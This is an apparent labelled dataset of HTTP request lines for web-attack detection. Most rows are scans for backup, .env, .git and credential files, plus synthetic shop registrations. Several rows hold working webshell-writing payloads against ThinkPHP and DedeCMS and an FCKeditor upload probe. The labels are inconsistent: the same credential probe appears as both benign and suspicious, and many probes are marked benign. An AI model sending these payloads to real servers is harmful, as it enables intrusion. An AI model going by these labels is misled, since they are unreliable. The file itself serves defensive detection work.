text,label
METHOD=HEAD PATH=/old/.well-known.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backups/public_html.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/.well-known.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/back/www.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/bak.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/Datasets Description/HTML_Bro_log_1/dns.html QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/dump.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/wallet.dat QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/sql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=POST PATH=/index.php/api/Uploadify/preview QUERY= PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/back/public_html.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/.git/info/refs QUERY=service=git-upload-pack PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.0,benign
METHOD=HEAD PATH=/restore/backup.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=GET PATH=/data/admin/allowurl.txt QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/bak/bak.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/up.php QUERY= PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/old/dump.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/backup.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/www.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/sftp-config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/backup.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/wallet.dat QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/www.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/uploads/up.php QUERY= PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/directory.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/ftpsync.settings QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/backup.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/sql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/.env QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/old/website.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/archive.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backup/www.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/restore/directory.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/www.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/website.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/sftp-config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/mysql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/.bash_history QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/bak.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/wp-content/upload.php QUERY= PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/old/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/.env QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backup/backup.sql.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backup/directory.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/.env QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/BlockCypher.log QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/www.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/honeypot/BSidesDFW - 2014.ipynb QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/sql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/www.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/www.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/www.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/backup.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/old/credentials.txt QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/website.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/public_html.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/public_html.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/www.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/bak.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/public_html.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/public_html.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/public_html.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/www.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/bak.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/images/vuln.php QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/.env QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backups/website.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/dump.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/website.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/application.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/old/directory.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/backup.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/directory.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/www.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=POST PATH=/uploads/dede/sys_verifies.php QUERY=action=down PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/restore/www.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/credentials.txt QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/backup.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/backup.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/secrepo.com.tar.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=GET PATH=/index.php QUERY=s=admin/\think\app/invokefunction&function=base64_encode&vars[]=ck996789baidu.com PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/backup/website.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/.well-known.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/back/public_html.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/directory.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/wallet.dat QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/ups.php QUERY= PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/backups/.env QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/bak/public_html.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/website.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/.well-known.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/bak/www.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/backup.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/website.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/backup.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/credentials.txt QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
"METHOD=GET PATH=/uploads/dede/sys_verifies.php QUERY=action=getfiles&refiles[0]=123&refiles[1]=\"";eval($_POST[ysy]);die();// PROTOCOL=HTTP/1.1",command_exec
METHOD=HEAD PATH=/old/directory.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=POST PATH=/FCKeditor/editor/filemanager/connectors/asp/connector.asp QUERY=Command=FileUpload&Type=File&CurrentFolder=/ PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/back/application.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=GET PATH=/Datasets Description/PE_malware/VirusShare.html QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/website.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/sql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/credentials.txt QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/assets/plugins/fileupload/server/php/index.php QUERY=file=tf2rghf.jpg PROTOCOL=HTTP/1.1,command_exec
METHOD=GET PATH=/upload.php QUERY= PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/restore/sql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/application.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backups/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/public_html.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/honeypot/bsidesdfw - 2014.ipynb QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/self.logs/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/restore/public_html.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backup/latest.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/restore/website.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/backup.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/www.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/credentials.txt QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/backup.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/.git/config QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/restore/directory.tar.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backups/public_html.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/sql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/backup.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/dump.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/.well-known.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/restore/public_html.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/backup.rar QUERY= PROTOCOL=HTTP/1.1,benign
"METHOD=GET PATH=/ QUERY=s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=txual.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$ PROTOCOL=HTTP/1.1",command_exec
METHOD=HEAD PATH=/back/www.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/sites/all/libraries/elfinder/elfinder.php.html QUERY= PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/restore/directory.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/.bash_history QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/sftp-config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/mysql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/backup.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/latest.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backups/config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/.bash_history QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/backup.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/dump.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/backup.rar QUERY= PROTOCOL=HTTP/1.1,benign
"METHOD=GET PATH=/ QUERY=s=index/\think\template\driver\file/write&cacheFile=ppeeu.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?> PROTOCOL=HTTP/1.1",command_exec
METHOD=HEAD PATH=/restore/bak.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/back/www.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/directory.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/.well-known.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/old/bak.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/restore/.bash_history QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/directory.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/.env QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/old/bak.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/.well-known.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backup/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/bak.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/credentials.txt QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/www.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/public_html.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/media-admin.php QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/old/sql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/wallet.dat QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/wallet.dat QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/bak.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/Archive.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=GET PATH=/wordpress/ QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=hutter&password=datilado&nombre=Lebera&apellidos=Pujadas+Serch&email=titre%40hispadis.tc&dni=43931807J&direccion=Juan+Ramon+Jimenez%2C+17%2C+&ciudad=Jimena+de+la+Frontera&cp=37338&provincia=Sevilla&ntc=1381126471579626&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=azhar&password=mohadA&nombre=Adelaida&apellidos=Tomasevich&email=cunthor%40mercadozoom.me&dni=87747494X&direccion=Calle+Alcala+Galiano%2C+144+10H&ciudad=Sunbilla&cp=17772&provincia=Lleida&ntc=6199550568888284&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=vonderwe&password=7n3a48&nombre=Katerina&apellidos=Pellis+Reig&email=celentano_daufil%40nikemujeres.hk&dni=80940508N&direccion=Avinguda+Can+Fontanals+16+7F&ciudad=Seva&cp=19118&provincia=Valencia&ntc=1183543291273675&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=peiling&password=VaS6&nombre=Gismundo&apellidos=Canas+Anglaril&email=moreland%40magichobby.km&dni=76543761Z&direccion=C%2F+Pau+Gargallo%2C+27+5G&ciudad=Capolat&cp=22135&provincia=Zaragoza&ntc=6142248987618034&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=burke&password=pellijero&nombre=Sofiel&apellidos=Pijuan&email=dhein7%40blueberryminiloaf.com.pe&dni=50806754F&direccion=Avenida+De+La+Pasion%2C+27%2C+8%3FF&ciudad=Mazarambroz&cp=16336&provincia=Madrid&ntc=9476466081196673&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=hunter&password=90m1r236a4&nombre=Gertrudis&apellidos=Cigala&email=muser%40global-services.dm&dni=33890004X&direccion=C%2F+Veronica+198+&ciudad=Villamayor&cp=37460&provincia=Navarra&ntc=3976120192503130&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=wilcox&password=c2n87n&nombre=Yamari&apellidos=Borbonio+Antonioli&email=stinehart_rigas%40sierradealcaraz.pr&dni=76322755S&direccion=Lince%2C+36+12%3FG&ciudad=Mues&cp=08460&provincia=Zaragoza&ntc=0968269656631790&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=adela&password=eNvasAdor&nombre=Belino&apellidos=Mayans&email=jennifer%40intelethernet.cz&dni=85492231N&direccion=Glorieta+De+Julio+Robles%2C+47%2C+&ciudad=Ojacastro&cp=46729&provincia=Palencia&ntc=7701825811955975&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=ruppert2&password=65rti3ismo&nombre=Alfonsina&apellidos=Cimino+Chac%F3n&email=nordstrom-driver%40inventoscaseros.pr&dni=65511934E&direccion=C%2F+Doctor+Rodriguez+De+La+Fuente%2C+S%2FN+&ciudad=Alqu%E9zar&cp=29493&provincia=Santa+Cruz+de+Tenerife&ntc=7812097176228751&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=jordanna3&password=desembarazadamente&nombre=Yamal&apellidos=Llebot+Sayago&email=doyle-murray%40ajuntamentbarcelona2-0.hn&dni=59201826X&direccion=Sierra+Alta+138+&ciudad=Iruelos&cp=19174&provincia=M%E1laga&ntc=6515740156899202&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=marykay&password=regoci6ad3r&nombre=Leonor&apellidos=Rea+Campmajor&email=close%40indagacion.mm&dni=09069178W&direccion=Calle+Benito+Perez+Galdos+139+&ciudad=Azut%E1n&cp=07195&provincia=Zaragoza&ntc=4288416752573801&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=dario&password=sep3&nombre=C%E1tulo&apellidos=Name+Baralt&email=michelot%40manzanilladevillafafila.mn&dni=13454128W&direccion=Virgen+De+Minerva%2C+48%2C+10%3FE&ciudad=Campot%E9jar&cp=31480&provincia=%C1vila&ntc=8246951041406295&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=yea-ping&password=cedacero&nombre=Leticia&apellidos=Santanton&email=bernstein%40beltoan.com.ck&dni=02401008S&direccion=Jardines+De+Capitan+Ramos%2C+138%2C+5D&ciudad=Vall-llobrega&cp=05280&provincia=Palencia&ntc=9922252856683961&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=sheehan&password=m%3Fi&nombre=Sharon&apellidos=Balac+Ginet&email=gotell%40muevemiweb.wf&dni=06136230Z&direccion=C%2F+Comandante+Roman%2C+S%2FN+&ciudad=Navas+del+Rey&cp=08696&provincia=Salamanca&ntc=0788909004705438&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=yerneni&password=%21afi2mamiento&nombre=Paulino&apellidos=Marc%E9+Chimal&email=thorntveidt%40cincocolores.museum&dni=81318789N&direccion=Sur+155%2C+8-F&ciudad=Od%E8n&cp=46890&provincia=Girona&ntc=1835703136482162&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=efdal&password=2lBOrad6&nombre=Ver%F3nica&apellidos=Carpio&email=sergeev%40manzanilladevillafafila.mg&dni=63838683K&direccion=C%2F+Fuente+Milanos+48%2C+5-D&ciudad=Salmer%F3n&cp=33394&provincia=Burgos&ntc=6234916143793622&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=maury&password=sos4ec6oso&nombre=Secundina&apellidos=Domene+Chimal&email=iranzo%40gopersonaltrainers.ug&dni=64695200H&direccion=C%2F+Gaztela+49+9%3FG&ciudad=A%F1e&cp=13532&provincia=Le%F3n&ntc=2068642813627921&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=emlynne&password=SiSteMatizaci%F3n&nombre=Isabella&apellidos=Cabot+Brot%F3&email=oland5%40schnaps.com.by&dni=51920905S&direccion=Camino+Ronda%2C+72%2C+&ciudad=Total%E1n&cp=28473&provincia=Valladolid&ntc=5686265534103266&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=petri&password=en%2Bcandelar&nombre=Ciriaco&apellidos=Farge+Ferrara&email=ester%40fighting-machines.wf&dni=96138987E&direccion=C%2F+Nicaragua+48%2C+&ciudad=Nov%E9s&cp=08795&provincia=Ja%E9n&ntc=7732206170893125&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=mirenda&password=d3v3c4%F3n&nombre=Cruz&apellidos=Munsech+Larramendi&email=amer_dierkes%40ajuntamentdebarcelona20.gm&dni=31996824Y&direccion=Plumbago+39+&ciudad=Vilavella%2C+la&cp=08280&provincia=Navarra&ntc=6005492859075787&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=soroker&password=di7377dor&nombre=Sadia&apellidos=Kisines+Selvas&email=unger-waldridge%40nuestrasantacruz.dd&dni=87425645T&direccion=Plza.+Maestro+191%2C+&ciudad=Fuentearmegil&cp=45180&provincia=Barcelona&ntc=2717952590420573&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=carlean1&password=sobReproducci%F3n&nombre=Raquel&apellidos=Resalt&email=dina%40cementoscalibra.py&dni=59007256C&direccion=Calle+Subride+Bajo%2C+70+&ciudad=Valenzuela+de+Calatrava&cp=34820&provincia=Salamanca&ntc=3315223857968488&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=yuyi&password=r%E1mneo&nombre=Bernardo&apellidos=Uterga+Sort&email=monti%40asyra.mu&dni=97887901Q&direccion=Av.+Juan+De+Austria+143+3%3FD&ciudad=Huerta+del+Marquesado&cp=46172&provincia=Lleida&ntc=6202971897742782&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=anya&password=guardamiento&nombre=Benilda&apellidos=Servan&email=manes-neely%40azkara.ps&dni=83598022Z&direccion=Calle+Lavinia+138+&ciudad=Viniegra+de+Abajo&cp=23330&provincia=Valladolid&ntc=8234877667951597&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=joyann&password=pan790ar&nombre=Jaganath&apellidos=Olivera+Chutas&email=leary_cery%40miquelmartin.ps&dni=68561214P&direccion=Palestina%2C+118%2C+&ciudad=Sartajada&cp=06473&provincia=Lleida&ntc=6440071898700767&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=brownlie&password=alunarse&nombre=Yadia&apellidos=De+Guzm%E1n+Comadran&email=macgowan%40comerciosdeaspe.kr&dni=23198131D&direccion=Tarifa+80+12%3FB&ciudad=Tinieblas+de+la+Sierra&cp=13450&provincia=Lleida&ntc=5773073819468614&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=shugong&password=murci%E9galo&nombre=Vanina&apellidos=Teixid%F3&email=denk%40hosterialasmajadillas.kr&dni=68398855Y&direccion=C%2F+Ajates%2C+59%2C+&ciudad=Potes&cp=28980&provincia=Cuenca&ntc=6527837981883617&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=o.neall&password=098a25t6s&nombre=Jidit&apellidos=Jurado&email=baggett7%40youtubeanunciox.ht&dni=91050642J&direccion=Avinguda+Sant+Julia+59%2C+&ciudad=Alfara+de+Carles&cp=38570&provincia=Burgos&ntc=4530913896674618&B1=Registrar PROTOCOL=HTTP/1.1,benign
